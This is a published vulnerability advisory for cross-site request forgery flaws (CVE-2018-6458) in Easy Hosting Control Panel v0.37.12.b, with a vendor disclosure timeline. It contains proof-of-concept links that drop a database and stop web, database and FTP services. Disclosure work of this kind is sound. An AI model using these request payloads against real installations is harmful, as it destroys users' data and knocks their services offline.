[+] Credits: hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/EHCP-v0.37.12.b-MULTIPLE-CSRF.txt
[+] ISR: Apparition Security          


***Greetz: indoushka|Eduardo|Dirty0tis***

Vendor:
========
www.ehcp.net


Product:
=========
Easy Hosting Control Panel
v0.37.12.b


Ehcp is a Hosting Control Panel.
Ehcp is a tool in a server to facilate the process of hosting domains, emails, adding domains, ftp users and so on.


Vulnerability Type:
===================
Cross Site Request Forgery(s)


CVE Reference:
==============
CVE-2018-6458


Security Issue:
================
EHCP lacks cross site request forgery security tokens to protect against unauthorized requests from remote attackers. To exploit these cross-site request-forgery issues,
an attacker must lure an unsuspecting authenticated victim into following a malicious URI or link.

No CSRF protection so clicking on a link we can delete Database(s):
<a href='http://127.0.0.1/ehcp/index.php?op=domainop&action=deletedb&id=7&confirm=1'>Drop my database please</a>

deleting db 7 :  myDB
Connected as user : root
Dropped database:  myDB

Success delete db from ehcp db user bozo : deleted from ehcp db
user bozo : deleted user from mysql
user bozo : deleted user from mysql.db
user bozo : deleted user from mysql.tables_priv
user bozo : deleted user from mysql.columns_priv 


CSRF Denial of Service(s):

Kill Apache
<a href='http://127.0.0.1/ehcp/index.php?op=dostopapache2'>Kill my Apache please</a>

OR

Stop / start services:
http://127.0.0.1/ehcp/index.php?op=dostopapache2
http://127.0.0.1/ehcp/index.php?op=dostopnginx
http://127.0.0.1/ehcp/index.php?op=dostopmysqld
http://127.0.0.1/ehcp/index.php?op=dostopvsftpd



Network Access:
===============
Remote



Severity:
=========
Medium



Disclosure Timeline:
=============================
Vendor Notification: January 26, 2018
Vendor Acknowledges issues: January 27, 2018
Mitre Assigns CVE : January 29, 2018
Informed vendor of CVE : January 31, 2018
Vendor "Will be fixed soon, I think." : Febuary 2, 2018
Request update : Febuary 8, 2018
Vendor : "no progress yet. Will inform you any progress." : Febuary 10, 2018
Inform vendor of 90 day disclose policy : Febuary 10, 2018
Request update : February 21, 2018
Vendor "Not Yet." : Febuary 22, 2018
Request update : March 3, 2018
Vendor "I plan to start check/fixes with Ubuntu 18.04." : March 3, 2018
Request ETA : March 4, 2018
Vendor "Will start working when Ubuntu 18.04 released" : March 4, 2018
Request update : March 25, 2018
Vendor "password storage already fixed, others waiting for next release." : March 26, 2018
Request update : April 13, 2018
Vendor "same situation" : April 15, 2018
Remind vendor of 90 day disclose policy : April 16, 2018
No reply
Request update : April 22, 2018
No reply
Remind vendor again : April 27, 2018
No reply
May 9, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx
